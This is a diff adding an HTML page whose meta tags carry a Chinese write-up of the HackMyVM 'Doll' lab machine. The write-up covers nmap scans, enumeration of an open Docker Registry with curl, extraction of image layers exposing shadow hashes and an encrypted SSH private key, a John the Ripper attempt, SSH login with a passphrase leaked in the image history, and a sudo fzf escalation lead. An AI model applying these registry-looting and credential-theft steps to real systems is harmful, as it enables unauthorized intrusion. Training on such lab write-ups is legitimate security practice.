@@ -1,0 +1,1887 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# hmv_Doll
+
+# 0.闲聊
+
+![image](assets/image-20250129201949-6vewhf4.png)
+
+**靶机：** https://hackmyvm.eu/machines/machine.php?vm=Doll
+
+**靶机 IP：** 192.168.72.129
+
+**kali IP：** 192.168.72.128
+
+今天年初二，有点空，更新一下wp
+
+# 1.扫描
+
+​`nmap`​开扫
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS -Pn -n -p- --min-rate 10000 192.168.72.129
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:16 EST
+Nmap scan report for 192.168.72.129
+Host is up (0.00020s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+1007/tcp open  unknown
+MAC Address: 08:00:27:F7:F4:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
+                                                                  
+```
+
+其中`1007`​不知道是什么服务，我们详细扫描一下
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sT -sV -Pn -n -p1007 192.168.72.129        
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:17 EST
+Nmap scan report for 192.168.72.129
+Host is up (0.00039s latency).
+
+PORT     STATE SERVICE VERSION
+1007/tcp open  http    Docker Registry (API: 2.0)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds
+
+```
+
+不知道是什么东西，我们等会搜索一下
+
+# 2.踩点
+
+在**hacktricks**​上找到[5000 - Pentesting Docker Registry](https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html)这篇文章
+
+![image](assets/image-20250129202845-u4dct3k.png)
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/_catalog
+{'repositories':['dolly']}
+                              
+```
+
+继续利用
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/dolly/tags/list
+{'name':'dolly','tags':['latest']}
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/dolly/manifests/latest
+{
+   'schemaVersion': 1,
+   'name': 'dolly',
+   'tag': 'latest',
+   'architecture': 'amd64',
+   'fsLayers': [
+      {
+         'blobSum': 'sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017'
+      },
+      {
+         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
+      },
+      {
+         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
+      },
+      {
+         'blobSum': 'sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09'
+      }
+   ],
+   'history': [
+      {
+         'v1Compatibility': '{\'architecture\':\'amd64\',\'config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'container\':\'10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\',\'container_config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'created\':\'2023-04-25T08:58:11.460540528Z\',\'docker_version\':\'23.0.4\',\'id\':\'89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\',\'os\':\'linux\',\'parent\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\'}'
+      },
+      {
+         'v1Compatibility': '{\'id\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\',\'parent\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'comment\':\'buildkit.dockerfile.v0\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'ARG passwd=devilcollectsit\']},\'throwaway\':true}'
+      },
+      {
+         'v1Compatibility': '{\'id\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'parent\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop)  CMD [\\\'/bin/sh\\\']\']},\'throwaway\':true}'
+      },
+      {
+         'v1Compatibility': '{\'id\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.348438709Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \']}}'
+      }
+   ],
+   'signatures': [
+      {
+         'header': {
+            'jwk': {
+               'crv': 'P-256',
+               'kid': 'X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS',
+               'kty': 'EC',
+               'x': 'm6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c',
+               'y': 'WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA'
+            },
+            'alg': 'ES256'
+         },
+         'signature': 'n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg',
+         'protected': 'eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ'
+      }
+   ]
+}                                                                                                                                     
+
+┌──(kali㉿kali)-[~/test]
+└─$ mkdir tmp     
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cd tmp 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ curl http://192.168.72.129:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 -o blob1.tar
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3707  100  3707    0     0   971k      0 --:--:-- --:--:-- --:--:-- 1206k
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ tar -xf blob1.tar
+                         
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls -la
+总计 24
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
+drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
+-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
+drwx------ 2 kali kali 4096 2023年 4月25日 root
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cd etc 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ ls -al
+总计 32
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
+-rw-r--r-- 1 kali kali  710 2023年 4月25日 group
+-rw-r--r-- 1 kali kali  697 2022年11月 4日 group-
+-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd
+-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd-
+-rw-r----- 1 kali kali  553 2023年 4月25日 shadow
+-rw-r----- 1 kali kali  448 2023年 4月25日 shadow-
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ cat *   
+root:x:0:root
+bin:x:1:root,bin,daemon
+daemon:x:2:root,bin,daemon
+sys:x:3:root,bin,adm
+adm:x:4:root,adm,daemon
+tty:x:5:
+disk:x:6:root,adm
+lp:x:7:lp
+mem:x:8:
+kmem:x:9:
+wheel:x:10:root
+floppy:x:11:root
+mail:x:12:mail
+news:x:13:news
+uucp:x:14:uucp
+man:x:15:man
+cron:x:16:cron
+console:x:17:
+audio:x:18:
+cdrom:x:19:
+dialout:x:20:root
+ftp:x:21:
+sshd:x:22:
+input:x:23:
+at:x:25:at
+tape:x:26:root
+video:x:27:root
+netdev:x:28:
+readproc:x:30:
+squid:x:31:squid
+xfs:x:33:xfs
+kvm:x:34:kvm
+games:x:35:
+shadow:x:42:
+cdrw:x:80:
+www-data:x:82:
+usb:x:85:
+vpopmail:x:89:
+users:x:100:games
+ntp:x:123:
+nofiles:x:200:
+smmsp:x:209:smmsp
+locate:x:245:
+abuild:x:300:
+utmp:x:406:
+ping:x:999:
+nogroup:x:65533:
+nobody:x:65534:
+bela:x:1000:
+root:x:0:root
+bin:x:1:root,bin,daemon
+daemon:x:2:root,bin,daemon
+sys:x:3:root,bin,adm
+adm:x:4:root,adm,daemon
+tty:x:5:
+disk:x:6:root,adm
+lp:x:7:lp
+mem:x:8:
+kmem:x:9:
+wheel:x:10:root
+floppy:x:11:root
+mail:x:12:mail
+news:x:13:news
+uucp:x:14:uucp
+man:x:15:man
+cron:x:16:cron
+console:x:17:
+audio:x:18:
+cdrom:x:19:
+dialout:x:20:root
+ftp:x:21:
+sshd:x:22:
+input:x:23:
+at:x:25:at
+tape:x:26:root
+video:x:27:root
+netdev:x:28:
+readproc:x:30:
+squid:x:31:squid
+xfs:x:33:xfs
+kvm:x:34:kvm
+games:x:35:
+shadow:x:42:
+cdrw:x:80:
+www-data:x:82:
+usb:x:85:
+vpopmail:x:89:
+users:x:100:games
+ntp:x:123:
+nofiles:x:200:
+smmsp:x:209:smmsp
+locate:x:245:
+abuild:x:300:
+utmp:x:406:
+ping:x:999:
+nogroup:x:65533:
+nobody:x:65534:
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
+root:*::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+adm:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+operator:!::0:::::
+man:!::0:::::
+postmaster:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+at:!::0:::::
+squid:!::0:::::
+xfs:!::0:::::
+games:!::0:::::
+cyrus:!::0:::::
+vpopmail:!::0:::::
+ntp:!::0:::::
+smmsp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+bela:$6$azVVFjn.mkvh.lhA$yAXPBGOZDXRdDBmn3obtzhUzxwfDD7u3YIcixohpKzTGpJS0Oeu7UVoguhmwg4DHNM8K5z7Tn93BBaDadM/A5.:19472:0:99999:7:::
+root:*::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+adm:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+operator:!::0:::::
+man:!::0:::::
+postmaster:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+at:!::0:::::
+squid:!::0:::::
+xfs:!::0:::::
+games:!::0:::::
+cyrus:!::0:::::
+vpopmail:!::0:::::
+ntp:!::0:::::
+smmsp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+bela:!:19472:0:99999:7:::
+                                 
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ cd ..                                
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls la 
+ls: 无法访问 'la': 没有那个文件或目录
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls -la
+总计 24
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
+drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
+-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
+drwx------ 2 kali kali 4096 2023年 4月25日 root
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cd home 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home]
+└─$ ls -al
+总计 12
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 .
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 bela
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home]
+└─$ cd bela 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ l -al 
+总计 16
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ./
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ../
+-rw------- 1 kali kali   57 2023年 4月25日 .ash_history
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .ssh/
+-rwxr-xr-x 1 kali kali    0 1969年12月31日 .wh..wh..opq*
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cat .ash_history                     
+pwd
+ls -la
+mkdir .ssh
+cd .ssh
+nano id_rsa
+vi id_rsa
+exit
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cat .wh..wh..opq
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cd .ssh       
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ls -al
+总计 12
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ..
+-rw-r--r-- 1 kali kali 2635 2023年 4月25日 id_rsa
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ cat id_rsa    
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+VtVwCw==
+-----END OPENSSH PRIVATE KEY-----
+                                             
+```
+
+省了，都不用爆破shadow了
+
+```
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh2john id_rsa > hash
+                                         
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:01:24 0.05% (ETA: 2025-01-31 17:41) 0g/s 105.4p/s 105.4c/s 105.4C/s passat..kicker
+0g 0:00:01:39 0.06% (ETA: 2025-01-31 17:26) 0g/s 105.9p/s 105.9c/s 105.9C/s strokes..jhoan
+
+```
+
+爆破不出来，不会是用这个吧
+
+![image](assets/image-20250129204242-qkg0s6r.png)
+
+试试
+
+```
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ chmod 600 id_rsa 
+
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh bela@192.168.72.129 -i id_rsa
+ssh: connect to host 192.168.72.129 port 22: No route to host
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh bela@192.168.72.129 -i id_rsa
+Enter passphrase for key 'id_rsa': 
+Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
+bela@doll:~$ id
+uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+
+```
+
+# 3.提权
+
+```
+bela@doll:~$ sudo -l
+Matching Defaults entries for bela on doll:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bela may run the following commands on doll:
+    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337
+
+```
+
+​`fzf`​ 是一个交互式命令行模糊查找工具，并且其 `--listen`​ 选项允许它接收来自远程连接的命令。">
+<meta property="og:title" content="hmv_Doll">
+<meta property="og:description" content="# hmv_Doll
+
+# 0.闲聊
+
+![image](assets/image-20250129201949-6vewhf4.png)
+
+**靶机：** https://hackmyvm.eu/machines/machine.php?vm=Doll
+
+**靶机 IP：** 192.168.72.129
+
+**kali IP：** 192.168.72.128
+
+今天年初二，有点空，更新一下wp
+
+# 1.扫描
+
+​`nmap`​开扫
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS -Pn -n -p- --min-rate 10000 192.168.72.129
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:16 EST
+Nmap scan report for 192.168.72.129
+Host is up (0.00020s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+1007/tcp open  unknown
+MAC Address: 08:00:27:F7:F4:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
+                                                                  
+```
+
+其中`1007`​不知道是什么服务，我们详细扫描一下
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sT -sV -Pn -n -p1007 192.168.72.129        
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:17 EST
+Nmap scan report for 192.168.72.129
+Host is up (0.00039s latency).
+
+PORT     STATE SERVICE VERSION
+1007/tcp open  http    Docker Registry (API: 2.0)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds
+
+```
+
+不知道是什么东西，我们等会搜索一下
+
+# 2.踩点
+
+在**hacktricks**​上找到[5000 - Pentesting Docker Registry](https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html)这篇文章
+
+![image](assets/image-20250129202845-u4dct3k.png)
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/_catalog
+{'repositories':['dolly']}
+                              
+```
+
+继续利用
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/dolly/tags/list
+{'name':'dolly','tags':['latest']}
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/dolly/manifests/latest
+{
+   'schemaVersion': 1,
+   'name': 'dolly',
+   'tag': 'latest',
+   'architecture': 'amd64',
+   'fsLayers': [
+      {
+         'blobSum': 'sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017'
+      },
+      {
+         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
+      },
+      {
+         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
+      },
+      {
+         'blobSum': 'sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09'
+      }
+   ],
+   'history': [
+      {
